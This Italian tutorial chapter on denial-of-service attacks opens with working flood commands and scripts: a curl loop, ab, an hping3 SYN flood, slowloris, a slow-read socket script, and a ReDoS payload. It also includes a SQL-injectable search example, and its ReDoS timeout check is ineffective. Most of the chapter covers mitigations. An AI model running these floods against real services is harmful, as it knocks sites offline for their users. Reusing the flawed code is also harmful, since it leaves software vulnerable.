# 17. Denial of Service (DoS) e Distributed DoS (DDoS)

## 17.1 Introduzione

**DoS** (Denial of Service) è un attacco che mira a **rendere un servizio non disponibile** sovraccaricando le risorse del server.

**DDoS** (Distributed DoS) utilizza **multiple sorgenti** (botnet) per amplificare l'attacco.

**Impatto:**
- 🔴 Servizio offline (downtime)
- 🔴 Perdite economiche
- 🔴 Reputazione danneggiata
- 🔴 Costi infrastruttura (bandwidth)
- 🔴 Customer dissatisfaction

## 17.2 Tipi di Attacchi DoS

### 17.2.1 - HTTP Flood

**Scenario:** Invio massivo di richieste HTTP legittime.

**Attacco semplice:**
```bash
# Infinite loop curl
while true; do
    curl http://example.com &
done

# Genera centinaia di richieste simultanee
# Server sovraccaricato → crash
```

**Apache Bench (ab):**
```bash
# 100.000 richieste, 1000 concorrenti
ab -n 100000 -c 1000 http://example.com/

# Benchmarking example.com (be patient)
# Completed 10000 requests
# Completed 20000 requests
# ...
# Server may crash under load
```

**hping3 - SYN flood:**
```bash
# TCP SYN flood
sudo hping3 -S -p 80 --flood example.com

# Invia SYN packets senza completare handshake
# Esaurisce connection table del server
```

### 17.2.2 - Slowloris Attack

**Concetto:** Mantiene **connessioni aperte** il più a lungo possibile, esaurendo i worker del server.

**Come funziona:**
```
1. Client apre connessione HTTP
2. Invia header parziali lentamente:

   POST /upload HTTP/1.1\r\n
   Host: example.com\r\n
   Content-Length: 1000000\r\n
   \r\n
   [invia 1 byte ogni 10 secondi]

3. Server aspetta header completi → connection rimane aperta
4. Ripeti con 1000 connessioni
5. Server esaurisce worker disponibili
6. Nuovi utenti legittimi: connection refused
```

**Tool slowloris:**
```bash
# Install
git clone https://github.com/gkbrk/slowloris.git
cd slowloris

# Run attack (SOLO per test etici!)
python3 slowloris.py example.com -s 500

# -s 500: 500 socket simultanei
# Ogni socket invia header lentamente
```

**Variante - Slow POST:**
```
POST /upload HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 1000000

data=[invia 1 byte ogni 5 secondi]

→ Server attende body completo
→ Connessione bloccata per minuti/ore
```

### 17.2.3 - Slowread Attack

**Concetto:** Client **riceve dati lentamente**, bloccando risposta server.

```python
import socket
import time

# Connetti a server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('example.com', 80))

# Invia richiesta normale
s.send(b'GET /large-file.zip HTTP/1.1\r\nHost: example.com\r\n\r\n')

# Leggi 1 byte alla volta lentamente
while True:
    data = s.recv(1)  # Solo 1 byte
    time.sleep(10)     # Aspetta 10 secondi
    
# Server tiene connessione aperta per inviare file
# Con 1000 connessioni → risorse esaurite
```

### 17.2.4 - Application-Level DoS

**Scenario:** Attacco su endpoint **costosi** computazionalmente.

**Esempio - Search endpoint:**
```javascript
// Endpoint vulnerabile
app.get('/search', (req, res) => {
    const query = req.query.q;
    
    // ❌ Query complessa senza limit
    const results = db.query(`
        SELECT * FROM products 
        WHERE name LIKE '%${query}%' 
        OR description LIKE '%${query}%'
        OR tags LIKE '%${query}%'
    `);
    
    res.json(results);
});
```

**Attacco:**
```bash
# Richieste massive su endpoint costoso
for i in {1..1000}; do
    curl "http://example.com/search?q=a" &
done

# Database sovraccaricato
# Ogni query scansiona intera tabella
# Server risponde lentamente a tutti
```

**Esempio - Regex DoS (ReDoS):**
```javascript
// Regex vulnerabile
app.get('/validate', (req, res) => {
    const input = req.query.data;
    
    // ❌ Regex con backtracking esponenziale
    const regex = /^(a+)+$/;
    
    if (regex.test(input)) {
        res.send('Valid');
    } else {
        res.send('Invalid');
    }
});
```

**Attacco:**
```bash
# Input che causa backtracking esponenziale
curl "http://example.com/validate?data=aaaaaaaaaaaaaaaaaaaaaaaaaaX"

# Regex impiega MINUTI per valutare
# CPU al 100%
# Server bloccato
```

---

## 17.3 Mitigation Strategies

### 17.3.1 - Rate Limiting

**Nginx - Limit Request Rate:**

```nginx
http {
    # Definisci zona rate limit
    # 10MB di memoria, max 10 richieste/secondo per IP
    limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
    
    # Connection limit
    limit_conn_zone $binary_remote_addr zone=addr:10m;
    
    server {
        listen 80;
        server_name example.com;
        
        location / {
            # Apply rate limit
            limit_req zone=one burst=20 nodelay;
            
            # Max 10 connessioni simultanee per IP
            limit_conn addr 10;
            
            root /var/www/html;
        }
        
        location /api/ {
            # API più restrittiva: 5 req/s
            limit_req zone=one burst=10 nodelay;
            
            proxy_pass http://backend;
        }
    }
}
```

**Parametri:**
- `rate=10r/s`: Max 10 richieste al secondo
- `burst=20`: Permetti 20 richieste in burst, poi rate limit
- `nodelay`: Applica rate limit immediatamente (no queue)

**Response quando rate limit exceeded:**
```http
HTTP/1.1 503 Service Temporarily Unavailable
Retry-After: 1

<html>
<head><title>503 Service Temporarily Unavailable</title></head>
<body>
<h1>503 Service Temporarily Unavailable</h1>
</body>
</html>
```

**Express.js - Rate Limiting:**

```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const redis = require('redis');

const redisClient = redis.createClient();

// General rate limiter
const generalLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minuto
    max: 100, // 100 richieste per finestra
    message: 'Too many requests, please try again later',
    standardHeaders: true, // Return rate limit info in headers
    legacyHeaders: false,
    
    // Store in Redis (distributed)
    store: new RedisStore({
        client: redisClient,
        prefix: 'rl:general:'
    })
});

// API rate limiter (più restrittivo)
const apiLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 30,
    message: 'API rate limit exceeded'
});

// Login rate limiter (anti-brute force)
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minuti
    max: 5, // Max 5 tentativi
    skipSuccessfulRequests: true, // Non conta login riusciti
    message: 'Too many login attempts, please try again later'
});

const app = require('express')();

// Apply globally
app.use(generalLimiter);

// Apply to specific routes
app.use('/api/', apiLimiter);
app.post('/login', loginLimiter, (req, res) => {
    // Login logic
    res.send('Login endpoint');
});

app.listen(3000);
```

**Custom rate limiter con IP whitelist:**

```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
    windowMs: 60 * 1000,
    max: 100,
    
    // Skip rate limit per IP whitelisted
    skip: (req) => {
        const whitelist = ['127.0.0.1', '10.0.0.1'];
        const clientIP = req.ip;
        return whitelist.includes(clientIP);
    },
    
    // Custom key generator (es. per user ID)
    keyGenerator: (req) => {
        return req.user?.id || req.ip;
    },
    
    // Custom handler
    handler: (req, res) => {
        res.status(429).json({
            error: 'Rate limit exceeded',
            retryAfter: req.rateLimit.resetTime
        });
    }
});

app.use(limiter);
```

### 17.3.2 - Connection Timeouts

**Nginx timeouts:**

```nginx
http {
    # Client request timeouts
    client_body_timeout 10s;      # Body receive timeout
    client_header_timeout 10s;    # Headers receive timeout
    
    # Server response timeout
    send_timeout 30s;             # Response send timeout
    
    # Keep-alive timeout
    keepalive_timeout 65s;        # Connection reuse timeout
    
    # Proxy timeouts
    proxy_connect_timeout 5s;     # Backend connection timeout
    proxy_send_timeout 10s;       # Send to backend timeout
    proxy_read_timeout 30s;       # Read from backend timeout
    
    server {
        listen 80;
        
        location / {
            root /var/www/html;
        }
    }
}
```

**Express.js timeouts:**

```javascript
const express = require('express');
const app = express();

// Global request timeout
app.use((req, res, next) => {
    // 30 seconds timeout
    req.setTimeout(30000, () => {
        res.status(408).send('Request timeout');
    });
    next();
});

// Server timeout
const server = app.listen(3000);
server.setTimeout(30000); // 30 seconds

// Per-route timeout
app.get('/slow-endpoint', (req, res) => {
    // 10 seconds timeout per questa route
    req.setTimeout(10000);
    
    // Operazione lenta...
    setTimeout(() => {
        res.send('Done');
    }, 5000);
});
```

### 17.3.3 - Connection Limits

**Nginx:**

```nginx
http {
    # Limit connessioni simultanee per IP
    limit_conn_zone $binary_remote_addr zone=addr:10m;
    
    server {
        listen 80;
        
        location / {
            # Max 10 connessioni per IP
            limit_conn addr 10;
            
            root /var/www/html;
        }
        
        location /download/ {
            # Max 2 download simultanei per IP
            limit_conn addr 2;
            
            # Limit bandwidth: 500 KB/s per connessione
            limit_rate 500k;
            
            root /var/www/downloads;
        }
    }
}
```

### 17.3.4 - Input Validation

**Protezione ReDoS:**

```javascript
// ❌ Regex vulnerabile
const badRegex = /^(a+)+$/;

// ✅ Regex sicura (no backtracking esponenziale)
const goodRegex = /^a+$/;

app.get('/validate', (req, res) => {
    const input = req.query.data;
    
    // ✅ Limita lunghezza input
    if (input.length > 100) {
        return res.status(400).send('Input too long');
    }
    
    // ✅ Timeout per regex
    const timeoutMs = 100;
    const startTime = Date.now();
    
    try {
        const result = goodRegex.test(input);
        
        if (Date.now() - startTime > timeoutMs) {
            return res.status(400).send('Validation timeout');
        }
        
        res.json({ valid: result });
    } catch (err) {
        res.status(500).send('Validation error');
    }
});
```

**Limit query complexity:**

```javascript
app.get('/search', async (req, res) => {
    const query = req.query.q;
    
    // ✅ Limita lunghezza query
    if (!query || query.length > 50) {
        return res.status(400).send('Invalid query');
    }
    
    // ✅ Limit results
    const results = await db.query(
        'SELECT * FROM products WHERE name LIKE ? LIMIT 100',
        [`%${query}%`]
    );
    
    res.json(results);
});
```

---

## 17.4 DDoS Mitigation

### 17.4.1 - Cloudflare DDoS Protection

**Cloudflare Worker - Rate Limiting:**

```javascript
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const clientIP = request.headers.get('CF-Connecting-IP');
    const country = request.cf?.country;
    
    // Block specific countries (geoblocking)
    const blockedCountries = ['XX', 'YY'];
    if (blockedCountries.includes(country)) {
        return new Response('Forbidden', { status: 403 });
    }
    
    // Rate limiting con Cloudflare KV
    const cache = caches.default;
    const cacheKey = `rate-limit:${clientIP}`;
    const cached = await cache.match(cacheKey);
    
    if (cached) {
        const count = parseInt(await cached.text());
        
        // Max 100 richieste/minuto
        if (count > 100) {
            return new Response('Rate limit exceeded', { 
                status: 429,
                headers: { 'Retry-After': '60' }
            });
        }
        
        // Increment counter
        await cache.put(cacheKey, new Response(String(count + 1)), {
            expirationTtl: 60 // 60 secondi
        });
    } else {
        // Primo request, inizia counter
        await cache.put(cacheKey, new Response('1'), {
            expirationTtl: 60
        });
    }
    
    // Forward request
    return fetch(request);
}
```

**Cloudflare Firewall Rules:**

```javascript
// Challenge se troppi requests
(http.request.uri.path eq "/api/login" and 
 rate(5m) > 10)

// Block known bad bots
(cf.client.bot) or
(http.user_agent contains "badbot")

// Allow only specific countries
not (ip.geoip.country in {"IT" "US" "GB"})
```

### 17.4.2 - AWS Shield & WAF

**AWS WAF - Rate-based rule:**

```json
{
  "Name": "RateLimitRule",
  "Priority": 1,
  "Statement": {
    "RateBasedStatement": {
      "Limit": 2000,
      "AggregateKeyType": "IP"
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "RateLimitRule"
  }
}
```

### 17.4.3 - Fail2Ban

**Protezione SSH/HTTP:**

```bash
# Install
sudo apt install fail2ban

# Configure /etc/fail2ban/jail.local
[DEFAULT]
bantime = 3600      # 1 ora
findtime = 600      # 10 minuti
maxretry = 5        # 5 tentativi

[nginx-limit-req]
enabled = true
filter = nginx-limit-req
logpath = /var/log/nginx/error.log
maxretry = 10
bantime = 3600

[nginx-noscript]
enabled = true
filter = nginx-noscript
logpath = /var/log/nginx/access.log
maxretry = 6
bantime = 86400     # 24 ore

# Start fail2ban
sudo systemctl start fail2ban
sudo systemctl enable fail2ban

# Check banned IPs
sudo fail2ban-client status nginx-limit-req
```

---

## 17.5 Monitoring & Detection

### 17.5.1 - Metrics da Monitorare

```javascript
// Express.js - Metrics middleware
const prometheus = require('prom-client');

const httpRequestDuration = new prometheus.Histogram({
    name: 'http_request_duration_seconds',
    help: 'Duration of HTTP requests in seconds',
    labelNames: ['method', 'route', 'status_code']
});

const httpRequestTotal = new prometheus.Counter({
    name: 'http_requests_total',
    help: 'Total HTTP requests',
    labelNames: ['method', 'route', 'status_code']
});

app.use((req, res, next) => {
    const start = Date.now();
    
    res.on('finish', () => {
        const duration = (Date.now() - start) / 1000;
        
        httpRequestDuration
            .labels(req.method, req.route?.path || req.path, res.statusCode)
            .observe(duration);
        
        httpRequestTotal
            .labels(req.method, req.route?.path || req.path, res.statusCode)
            .inc();
    });
    
    next();
});

// Metrics endpoint
app.get('/metrics', async (req, res) => {
    res.set('Content-Type', prometheus.register.contentType);
    res.end(await prometheus.register.metrics());
});
```

### 17.5.2 - Alerting

**Grafana Alert Example:**

```yaml
# alert-rules.yml
groups:
  - name: ddos_detection
    interval: 10s
    rules:
      - alert: HighRequestRate
        expr: rate(http_requests_total[1m]) > 1000
        for: 2m
        labels:
          severity: critical
        annotations:
          summary: "High request rate detected"
          description: "{{ $value }} req/s"
      
      - alert: HighErrorRate
        expr: rate(http_requests_total{status_code=~"5.."}[1m]) > 10
        for: 1m
        labels:
          severity: warning
        annotations:
          summary: "High 5xx error rate"
```

---

## 17.6 Best Practices

### 17.6.1 - Checklist Anti-DoS

**Infrastructure:**
```
✅ CDN (Cloudflare, AWS CloudFront)
✅ Load balancer con health checks
✅ Auto-scaling (AWS Auto Scaling, K8s HPA)
✅ DDoS protection (Cloudflare, AWS Shield)
✅ Firewall rules (geoblocking, IP whitelist)
```

**Application:**
```
✅ Rate limiting (per IP, per user)
✅ Connection limits
✅ Request/response timeouts
✅ Input validation (lunghezza, format)
✅ Query optimization (indexes, limits)
✅ Caching (Redis, CDN)
✅ Async processing (queues per task pesanti)
```

**Monitoring:**
```
✅ Metrics collection (Prometheus, Datadog)
✅ Alerting (PagerDuty, Slack)
✅ Log analysis (ELK stack)
✅ Traffic analysis (anomaly detection)
```

### 17.6.2 - Nginx Complete Config

```nginx
http {
    # Rate limiting
    limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=api:10m rate=5r/s;
    limit_conn_zone $binary_remote_addr zone=addr:10m;
    
    # Timeouts
    client_body_timeout 10s;
    client_header_timeout 10s;
    send_timeout 30s;
    keepalive_timeout 65s;
    
    # Limits
    client_max_body_size 10M;
    client_body_buffer_size 128k;
    
    server {
        listen 80;
        server_name example.com;
        
        # General protection
        limit_req zone=general burst=20 nodelay;
        limit_conn addr 10;
        
        # Block bad bots
        if ($http_user_agent ~* (bot|crawler|spider|scraper)) {
            return 403;
        }
        
        location / {
            root /var/www/html;
        }
        
        location /api/ {
            limit_req zone=api burst=10 nodelay;
            limit_conn addr 5;
            
            proxy_pass http://backend;
            proxy_read_timeout 30s;
        }
    }
}
```

---

**Capitolo 17 completato!**

Prossimo: **Capitolo 18 - Session Hijacking e Session Management**
